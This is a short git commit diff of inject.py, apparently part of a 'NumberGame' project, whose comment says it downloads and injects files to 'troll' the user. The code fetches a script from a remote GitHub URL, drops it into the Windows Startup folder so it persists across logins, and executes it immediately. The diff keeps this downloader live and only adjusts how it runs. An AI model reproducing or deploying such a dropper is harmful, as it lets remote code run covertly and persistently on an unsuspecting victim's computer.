d14a8f2f37d34727b858e7b6f529e789f39e54de
xXEthyleneXx <xXEthyleneXx@protonmail.com>
2021-02-19 07:36:43 -0500

    `

--- inject.py
+++ inject.py
@@ -1,11 +1,11 @@
 # Downloads and injects the files needed to troll your dumbass
 def clone():
-    import os, urllib.request, pathlib
+    import os, urllib.request, pathlib, subprocess
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
     home = os.path.expanduser("~")
-    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.pyw'
+    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.py'
     urllib.request.urlretrieve(dlurl, '{}'.format(path))
-    os.system('{}'.format(str(path)))
+    subprocess.call(['python.exe', '{}'.format(path)])
     exit()
 
 clone()
